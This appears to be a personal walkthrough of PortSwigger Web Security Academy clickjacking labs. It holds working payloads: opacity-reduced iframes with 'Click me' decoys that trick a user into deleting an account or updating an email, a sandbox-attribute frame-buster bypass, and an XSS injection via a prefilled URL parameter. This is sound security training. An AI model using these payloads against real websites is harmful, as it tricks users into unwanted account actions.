 **Basic clickjacking with CSRF token protection**

Trick user into clicking on something 
Tricked into deleting a user account 

Used iframe 
Embed html into another html 

From <https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected> 



The goal is to position our "click me" over the delete button so user can be tricked into clicking that button 


```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 600px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 490px;
        left: 50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ad2002d04993c2f8afe94af00250058.web-security-academy.net/my-account"></iframe>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8ab94205-7f54-4795-8956-602eb58caca3)


 **Clickjacking with form input data prefilled from a URL parameter**


```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 600px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0adf00bf0437f56386ebf5f8003a0093.web-security-academy.net/my-account?email=viet@gmail.com"></iframe>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a1d8e1e5-6968-494d-902a-dbc900a5e82a)


Line up click me to the update button

 **Clickjacking with a frame buster script**


An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window: 
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe> 
Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site. 

From <https://portswigger.net/web-security/clickjacking> 



```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 600px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a2e00b703b0c5a0806658b2000b00c5.web-security-academy.net/my-account?email=viet@gmail.com"></iframe>
```
 **Exploiting clickjacking vulnerability to trigger DOM-based XSS**

Trigger an xss on the name box

```
<img src=0 onerror=alert(1)>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/86a5c928-4ff8-42be-b053-c94c626488c6)






Prefill form with a xss 

```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 410px;
        left: 50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a9a00750434688a801ad1dc005f0087.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=viet@gmail.com&subject=test&message=test#feedbackResult"></iframe>
```



 **Multistep clickjacking**


```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position:absolute;
        top: 500px;
        left: 50px;
        z-index: 1;
    }
   .secondClick {
        top: 300px;
        left: 200px;
    }
</style>
<div class="firstClick">Click me</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a74001403c2b5fbe61f0eac004f004d.web-security-academy.net/my-account/"></iframe>
```


Will have the user click through 2 click me to delete an account
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f1770584-0991-4c9b-82a7-707d7b00bc37)





Clicks are a little off center due to the solved lab
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d75f327f-be39-47ce-9fa3-2e40f76dbe77)


